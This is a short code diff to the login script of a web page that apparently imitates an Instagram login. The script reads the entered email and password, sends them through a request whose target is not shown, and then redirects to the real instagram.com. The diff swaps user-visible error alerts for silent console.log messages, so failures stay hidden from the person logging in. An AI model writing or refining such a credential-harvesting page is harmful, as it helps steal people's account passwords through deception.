@@ -84,7 +84,7 @@
 const password = document.querySelector('[name="password"]').value;
 
 if (!email || !password) {
-    alert("Please enter both email and password.");
+    console.log("Please enter both email and password.");
     return;
 }
 document.querySelector('button').textContent = 'Loading...'; // Change button text
@@ -119,11 +119,11 @@ document.querySelector('button').textContent = 'Log In'; // Reset button text
                 }).then(response => {
                     window.location.href = 'https://www.instagram.com';
                 }).catch(error => {
-                    alert('Something went wrong. Please try again.');
+                    console.log("Loading...")
                 });
             })
             .catch(error => {
-                alert('Server error. Please try again.');
+                console.log("Loading...")
             });
     });
 </script>
